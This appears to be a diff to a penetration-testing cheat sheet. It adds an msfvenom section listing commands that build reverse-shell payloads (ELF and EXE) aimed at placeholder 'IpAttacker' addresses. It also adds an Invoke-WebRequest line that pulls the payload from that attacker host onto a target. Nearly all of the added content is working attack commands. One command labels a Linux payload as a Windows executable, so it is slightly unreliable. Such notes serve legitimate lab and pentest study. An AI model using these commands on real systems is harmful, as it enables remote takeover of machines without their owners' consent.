@@ -38,3 +38,15 @@ cd /usr/share/powershell-empire/empire/server/data/module_source/management
 python3 -m http.server 80
 ```
 
+## Mfsvenom
+
+```
+msfvenom -h
+msfvenom --list payloads
+msfvenom --list platforms
+msfvenom --list formats
+msfvenom -p linux/x86/shell_reverse_tcp --list-options
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=IpAttacker LPORT=PortAttacker -f elf > shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=IpAttacker LPORT=PortAttacker -f exe > windows_reverse.exe
+Invoke-WebRequest -Uri http://IpAttacker/windows_reverse.exe -OutFile windows_reverse.exe
+```
